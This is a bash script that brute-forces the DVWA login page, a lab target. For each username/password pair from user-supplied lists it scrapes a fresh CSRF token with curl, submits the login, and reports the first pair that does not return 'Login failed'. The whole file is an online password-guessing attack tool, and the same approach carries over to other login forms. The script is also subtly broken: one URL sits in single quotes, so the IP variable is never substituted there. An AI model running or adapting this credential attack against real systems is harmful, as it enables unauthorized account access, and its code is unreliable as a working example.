#!/bin/bash
# ig: @thelinuxchoice
read -e -p "Target DVWA IP: " ip
read -e -p "Users list:" user
read -e -p "Pass list:" pass
for u in $(cat $user);do
for p in $(cat $pass);do
CSRF=$(curl -s -c dvwa6.cookie 'http://$ip/dvwa/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
check=$(curl -s -i -L -b dvwa6.cookie --data "username=$u&password=$p&user_token=${CSRF}&Login=Login" "http://$ip/dvwa/login.php" | grep -o 'Login failed')
echo "trying: user=$u pass=$p"
if [[ $check != 'Login failed' ]]; then
echo "found! $u:$p"
exit;
fi
done
done
